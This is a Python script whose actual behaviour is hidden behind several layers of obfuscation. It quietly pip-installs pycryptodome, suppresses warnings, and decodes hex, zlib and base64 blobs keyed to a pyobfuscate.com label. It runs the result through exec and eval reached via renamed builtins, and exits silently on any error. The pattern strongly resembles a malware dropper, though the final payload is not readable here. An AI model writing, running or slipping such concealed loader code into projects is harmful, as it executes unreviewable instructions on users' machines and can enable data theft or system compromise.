import random ,base64,codecs,zlib,sys;py=""
import warnings, subprocess

def check_installation(package):
    try:
        subprocess.run(["pip3", "show", package], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        return True 
    except subprocess.CalledProcessError:
        return False

package_name = "pycryptodome"

warnings.filterwarnings("ignore", category=Warning)

if not check_installation(package_name):
    subprocess.run(["pip3", "install", package_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
try:
    sys.setrecursionlimit(1000000000) 

    pyobfuscate = (lambda **kwargs: (list(kwargs.keys()),list(kwargs.values())))(**{'https://pyobfuscate.com':'ConnectionRefusedError + filter','exec':'F8RpQD1rzY5aeMPWpXisGwpZBnbkATJwBHmHde7cSQAeH2T9HNu2DzQN9Ry5CmuZUPXZudKGlpNSXMzC','eval': bytes.fromhex('''78526ae04382b4e386f9b49cdbf3a546d4115b2049cce28c10148902254792b0debcf79afd2fc815f08b666c3af3fa6daf608ea8da7aa79a56e71857e7a653990c1f838420d0b531673bd195b8df5682f0942732d5f2c699cc34abf3468e64fe5200b33fe949bd2d3a8e6fb48850a290e3b05989225446a8d8fc61554857a322b651909a6103e218352f7409a93e773caa7d098e4f4d7a870ee6038b6d8fd0332bd8098f43e81becf2f05a2641b51fce2eaa2ddbf56e31ebe051e1a976d177bd7c34018b507f409bad80eb620f9452f3981153c4096273940c5cf124733ff6e62122d933148daaa1a5157ed6e456039f83989edbe5be2b3b371963806df369ab87f1b7adc04ef8ca2082dce0d825b287bcdefd211838d1b88a75e1b9b1d03e11df7cf6fe846d47fdf8b2438ceebb10b67cae158cba3edc2e8195fad466e65b01f34783b44528885fc01b0f838ce23301ac5c3cb314a8e5ec0bb9479634aa2a1a19cf141413d79e2f253d4e04a3dbda68777c0d0c7b222e3586bc4d15b90764499a6317ddce2916d36bd4bb90291004d75e05b3db74a2b9687d646906d3f0036dd7b13fbdb408b0a971b94f4e4b9d8710a6a584ee60e3d4a9bff07b1886efe87ad5962de74a90a2c204d1036586d80fc4fc8fbc8b4e398d85b71c46997a9f29ea3611798b0ceb8ec20d1ffab897e930fefb563046164a6cc48aa81d7dd13832f09675be2e5a0ed1dd2d38b72c19c6bd3a6e8a9173cf6f662fa3b8760425eb98765f4064266c628a6e1fb9ed2616a45046c5273c9ebcaca86017b030553e37dcc489ad50d44bf8556bc483918009e7826e56a247abe33ed39655eb50c743c65ce80f1b34d71a5c30644f486ee822f5879a1708dd3c7551f3e7189d17a146a90a802e620871d28a51cb38bb294a09336fce47534a9637d8b060c06408514514bd117ae10157f0fce61984cd95901ed4960553a05d670bf33f7310cee10366ab2dba7f26ac462f4cb7c3b3682d6fad55ebe93a7ee0e5d69b5dfdd5dd7de843f956a08c19eefc0a1f09ae4912af08c892488ebdc4f51bb4041e4a50787753afdc639267ba4ecd2199473bb9cd5c253b21553609b114c3b4c8ad3174c45db48d400ba0a528e7bf59e1f1007b9385c0ad46c53c369f723491d147a7cca8512a625b870ea29dfc4573a7a0dcdb88a12617f1d6e8297976a66fa0cd05a7f6ca8ba0078014ec640318d01bce67b804f98354a72123de5f6b4e876fbd0de0d8646dd5777cc12d58fb1d38948b05121f490bea94d730b18aed5c13887f2e4a775215c4be75ef032ff4db2469ea6359a049ecaac2b23f7084bd7804d4ff1951eb68e71a828f6e5fe427baf82ff97237fcffa723af80b0d613182255975172cb3eaeb5c37cb0580580306ce867c515100b65c7f6b9f37641aac04a481e211112ea1cd97a072f5ac138305e143d637ab446e6ed141deefb89351c6a826836837ad4aa431205b404f76e9523e2d3db9de286b5ffd7e3e558b4998e66631a2a334516d0c82f414b121fa4182118798ae3010c5444c39119bc91466b1a3322d2827b64033485c0971946be93565adbefed9f04808062ed52ae0a6ae9d2f239a8f7a8c277e6e48668c947f19cfc4f3da60bb22f982cfb4455d87011dbe888eabf576dcfc540407f0e29c4edfe385376f44b96878575fb98ca53f2095c44dfd9a153a32c59848eb5d6096f24e63885e9d53138401a23cd8bc52d8ced35548a6157a65e49c07971db714ad8cbc7e1bf0704a11bd980a00cde12ed95d0a5167e8ce31ba636b411d960e1991e56f7fadec59144bd95d2fc24b8c5e34f05da84be9adfd42ab197239e13a3ea8535d41a3dfd0c2873d4e1c196cc2bf0646c34a0abd97b3a706b38dac7e8a42126ec5ee3f0a60067a4030459f1d9df2a0e4646a54b6300c3806705a985cba38eb23b224e22190891fa9a1555b21484235dabfa3ab99e040d2c4bad8d6056f86c87f2b7379f06e35e36b8817132120a98f8c151f092d76281057831b59870055e35c0e282502afeda9438ff348301594a569bb708304b3de7fa6a24d6207ded8b038c24bd50fb53ccef462dfb4ac08b948c557d464515d112e524f7ebc9ef0616059b3a67f59dd7d6174ee658143e4a9f42c3e6ae6df6ab07d8f313a25eaaa7ea81db650623252c1bdfe7b5e6b48e6e23b549e9ed9d6518d9b1eaefaa50756cff25a6e5373d3d7e6ac3feba1fa53b6661c955f9938a7b0def456be44da12e1dd8cf551c08f5f5f0a7eda8e9a0bfecd6c048fc0b8749a5169f9e323bddfb110201cb5957e0f1a9673b41d061f3a679a666757639db2d01e8774b0220e3e1ddccdee7489a5f1d8de431e58f638b6098d833cc0cd4add2f45edaf9510b52e97da30717487608cb5255198a64234801143080047ed50da41449e060088d83448570268162a51a501c1bff1a1a92c811073bc3b7623bc6d456d6e9a387882fe99032c8e6e31679bfbccd15508eefca12b2cd6e0a969153ca5954f9f655736ffe07015a75880c266e24733754e214fa2213fc83a87797a44d223442f6fe43f43d2ba6a805acb292654c199cd2c4dbc163fcb8c690c7da154153b19a285e4673a6671451cf684990b4c6b411b5b1bfe4c028afb5b42306269978c08ef3d37b46d70b7d14300771da31a69903b2deaa5384b34c525991ef0becde49a9c3c31563d46e23d89da0c97d27e60dec34e3c7311827612a8fe5816e30f264ddd77f1fdc24193de805684411acf3d236673f42290ab44109b098e4d059a2b4f14a115667d9f7b748898f7102c1c56290f2ece336b0bac4171c584e9ba2b156687a1ad81baf5a29ea196c0f4178fa2064fde3ebaf8ff2128ffd45a127037bc883b22a25d8276f3b8e79996b24f074d04b6c4496ac6263c34bc17ea93ba847e2877c43c0772ca468c2c1b44496073b9c46046777b6c01bf10f45cb15ee5550733b79f053e9d8870a75d040affcb3e5ea700b3a6eda739090dc49792c8974e2f9543d50214c7ac379ae5ebd7b5f7ae7462237cc0f2e597e8eee4bce9d7776ec99fad36a74554f002daf5b9aa773e7fdf4f918ca653820601ca1ec4642ee44bc2a73565b5ae72c2f323801eb0c7c38c0581861d9f73cb0199588d15090fc8e9217a1b54de3726ccc03761d6511a1cc24b9add16406e15500461ccbaf35d4aaf41bd873fd593f529d6cb2b1e3fa16fe56234b6b6bb8b6d4c74b233feff3bdb3a0c27a92c4a25bb12f8af10a7de48b0f5bc197b59cc13ec2a9a370c2e05c49d779d10e10281ad32f57bdb6a5a36653d9cf6c8c4e4fccd5d93788b3cbf104c420e517b420494121bb5c0cfa0cc0b4b315fc6f7f31070ffa6f97396d87d21b72da5d33a2bdc16b6acbcb9fc1b3a6e199c78298a71ec0a67f6976e92d421d121152664982162cfdec95d2f0472495be988ce4b65871e0bbb5debc852bb799c9d2779fd8662f8ca8e3a846ed22d97ce9cad8868b9a3332812d372c576d06323d7f8a442ccc55586b5936277d1ff20f75c8
    ee58cfe8d8d8d2f400679eb91477c15824e416522da5f1d206690fe16eb99e10540a5c206c149cd1bf680ac8b146b275f79cc0ee9e5887c327599e6a70ef9dda205255e3773009802773b24f5b89b8cb97e9879404b2043a1dd6241e3f1c23f4afe891b37161c19d8faaa893468bf75925dabc0858fb221ec53d2f2bbdc9b74e9f4d83ca85b070db8fe0b2120337ffc2ce3e14369349e8012ae930c0dd09c5c656434b40889ce54308361d70c91b03c02e8c15ebcdef7793cfbc7a687d2c7000393018b40d442b0cd5548b6de71d39d084c1e17dd1bf5b47edcbbded6e24aa2597fbaa72e8ad983863302ad1eaf2a02257ea77c6098e9b9aa2a6b09475d327ad43a75a9d1485063316705063d15b90aa0a6770e2c05d88cb7004519781dd94ac95e8d7ac987d9eeabe38e903c4f4e7fb8edcf63d51a967915655e924c2352d055d475ca3d2e1dc67e139a8c26f6393823085502a56ff3091b97e6b405e12979b8310ca5b20243b0d7f3f169131df45c7b684d2751d65d8768a80cb052e9ec4b5a8f9de8f691e6b2164e8c5103c80757520262bfafab885d6dc0754a2d4055a677a9fa8d5711a38388e5abb7094eb3e2368a3fa04be675acfb2dd40f40678286f6d7815274209a335eceb8864a63705af5e73cd92466cba0bd7805ef6d85f0a28b9cdaffd657eedf044847c432d9faa5d16bd4c065fcc6d46ec7c9f2894eb70407e4f7f82e1eb4e4fbf741a0ef8e8b76675d55f8cac3188342032e460d547577bb04c2d1a78bd0cb7a04766d6194421cd325c8ad635a4c1da15366cd748c183d0d6f0d6a24d66b2fa4a4d1c8a11a6a872037cbdb64f9623e45e24c32ee5fd7be0bb0eb1bebf36d1d3b1ea00472f3a9fcc2c960333fd12e6ae74a5551f984bc2a63863dc9ceddf796223e45e32b7b1cd16310c9d076642721e09bb5a94257b70c8d792a7f6565a77736328a8f2e38115dd33596ebdd1510e2a5d79826ec7d999672bbf97104a856741cf26b90e44d988fedc8c8f705e589f97d38947a027dfbeaab5c452cffca0992f61684649fb5f0ac9dc1aefb91290f11e391e14a7d8d9427306d9a342fe82b5ff42a5cc0e8954aa82464a6a30bcfaf4c603dc4b873162460c8d8321c40bf92660609b0743152d1d8707fd78f082d6a03934bdd6a22f6603d0bb6521165f0b3fad2194114ce845518df931de866c6d2dde3b842ca8'''.replace("\n","")) })

    _=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='173340 8805560 896154 1313092 2579318 789730 639744 257568 342528 2087616 2921076 4804986 6045060 9043621 825024 10964520 165236 10846079 7787403 5794673 5243655 299744 4538705 1367584 664545 6389362 10310720 9037509 7260204 3508768 653344 4463196 3208164 8624020 519530 6131205 7261440 4221063 1381882 6542480 4191892 498104 902270 320544 1697728 3039584 634528 7135856 1776462 1987965 967780 8944064 478680 3175192 3985072 4425435 10842048 1325728 7531440 7633010 5469975 1958892 4943120 5254416 4120092 1846784 1527714 7404714 10891392 9482031 8608937 1154255 9061224 1344465 2946950 2578613 3627143 5550195 3078790 5353600 331344 10291172 812960 1380026 7764848 5969382 5929609 362135 9281650 1440224 8175344 4208490 11217200 4794167 3007092 1178912 11069300 2271948 760160 4902795 804000 5517225 1789996 1516706 741321 4934996 1758309 2770440 1351875 8995800 359760 1477189 951180 181760 3479628 8529192 1587342 5133108 934755 1248856 1406160 1704386 8452184 10446148 3049408 8412656 11119810 1758908 3089686 1021498 9698528 5677683 10506594 192276 2354874 5461560 7644050 7106616 9152823 1089820 7449457 4295710 9534888 288267 6200901 2646758 3672592 6379120 2942600 4417671 1003174 2970612 10663030 2005416 3542756 8935320 2747460 2720034 2113058 1165272 4704612 6906077 7357080 5260484 336340 755160 6032766 6132159 1203094 77220 1732608 1854816 2815872 1970496 6815538 8029362 8617818 3163834 1564512 930846 3031055 181516 3260320 5728820 1546976 9100520 740000 7965930 8766543 10715040 6323559 5994690 1169164 1185536 566711 6388440 7032795 9826175 6728000 5532075 2583136 2931146 8405350 1619872 5879917 5016720 926550 2118496 3039936 1393344 727712 2516034 6586692 7821615 4410358 524576 7927176 5657655 1877632 5866665 7819006 10541440 1572759 4490688 2847916 2985984 813185 5925367 4485488 7177060 7200490 3422826 2657632 8254118 10564705 1563744 3411772 2394104 2061576 5512698 8648630 8651875 6691857 7866824 7225944 341040 115168 2461408 1892736 2048736 6437016 6276051 95634 501054 6113256 6333811 466080 2948985 846560 1669600 4671840 3008728 4262635 98280 1889095 1744275 1755374 3454686 8880704 1578927 5198115 8601012 10791309 5382432 2436896 1595654 4111848 5106092 5949689 5632770 6470360 3818828 5255612 3011880 10668172 2981664 4272485 9900464 205650 1949682 703728 5179038 1896444 3653065 2196094 1743308 3842012 4473588 7319060 5451206 1492424 3905952 4672560 3002312 697714 1109967 5291776 2804439 1548729 5403888 10338762 925452 4092181 2829990 6361616 3835572 4719923 2463289 9747055 1062950 678454 7926048 5279280 4518432 11968 386490 631840 2649152 1818368 2263936 2380832 329700 5344494 2636032 4348252 808080 1355880 1742832 1808051 707250 5317126 1565138 226800 10811874 9121905 1697507 2532802 641890 1702592 923808 1214848 2609888 2912320 987520 675008 3024608 7376712 5365322 4477066 5118543 3318868 299768 3844560 8749328 772436 3216901 5420 2566816 1867872 1405152 1125952 8029298 868428 10079160 3219120 1489120 8910220 496680 3599520 3528112 3003650 2780497 2540772 4462943 2447928 7969170 722007 4832446 5683014 346320 1151008 1722496 2352128 2965408 1188128 3167776 2512416 966080 10928154 5252606 8128675 465090 3124050 351682 796400 6614160 960700 2179314 658690 219936 2439968 2776128 1162688 3669435 2449428 2950304 9276749 3374520 3104000 11132240 3961374 545259 3273443 358741 6605060 3092942 10152000 4178525 180083 2362166 46690 2587136 177824 2894688 689920 2751584 1276544 2648288 3129632 1765841 9990750 3758632 7037264 796352 7664772 644896 3605397 657360 1030320 10002470 897492 7808202 2996120 918064 162894 1239471 3436180 3194232 2711296 2371024 311149 1360288 1846395 7323545 251744 9497030 148480 9319876 4303024 9047570 4703754 9365265 5626116 4798106 1910240 10078830 7144092 9834324 1653440 8642562 5062500 2781030 1635326 782240 2229568 1040608 802784 809984 6763768 11433480 1505809 1679931 1201560 5953818 10601808 7089190 5075510 448280 6688304 2111000 4030997 4081580 8018874 3351685 6049211 7803900 3757400 1161571 2562172 495520 2928896 3056576 406880 171936 118670 9409362 7237560 322542 1423797 139104 11566940 2242744 507990 29472 428640 1702240 1983808 10029199 9099840 8076061 7080084 3203200 4696896 7679232 1763451 943270 890070';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJyLKi/JcnL3M3UKLDFxCizIigosMY1yrzAGAGYBCAQ=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kMtugzAURH8pOKCGpSPiBoOjIFxj2AFteIRXWhtsf33dtOruzGikmXuzYSlZmcnZnLoZeSPBoeKp/xU5hyo26Uhe411uGID0pGPgK4LkNgPL+6IlNHwyf6tvE2Z/2ukXE47LINc4ghpuQRtv8e4/S1nNkacIhh2h54qje/+JvPcZ6JZTWC2rrOcyqCZ0cDlSghh/YFSJCbsCj+perL04JsLNrxev2MSNJYX348Hk4kZI1bkJ29+dwvao+ghCl+CiegDp8b3uHqiRizl/2I2SUN2SodlNVI8cSGe6Ptl66mUxqb3Hb/ISaoKDqkBqzeyvvgEFpGq5")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')

except Exception as e:
    exit()